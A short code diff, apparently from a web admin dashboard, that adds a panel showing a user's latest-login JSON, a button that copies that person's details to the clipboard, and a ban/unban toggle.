+  ${dsec("raw json (latest login)")}
+  <pre class="small mono" style="white-space:pre-wrap;word-break:break-word;background:#0a1220;border:1px solid #1e2c44;border-radius:9px;padding:10px">${safe(JSON.stringify(ev[0]?.details||{},null,1))}</pre>
+  <div class="btnrow" style="margin-top:12px">
+   <button class="secondary" onclick="copyPerson('${safe(username)}')">COPY JSON</button>
+   <button class="banbtn ${p.banned?"on":""}" onclick="setBanned('${safe(username)}',${p.banned?"false":"true"})">${p.banned?"UNBAN":"BAN"}</button>
+  </div>`;
+}
+
+async function copyPerson(username){
+ const {data}=await db.rpc("person_details",{p_username:username});
+ const txt=JSON.stringify(data,null,2);
+ try{ await navigator.clipboard.writeText(txt); toast("Copied"); }
+ catch{ toast("Clipboard blocked","bad"); }
+}
+
 
 /* RESTORE LOGIN */
 (async()=>{
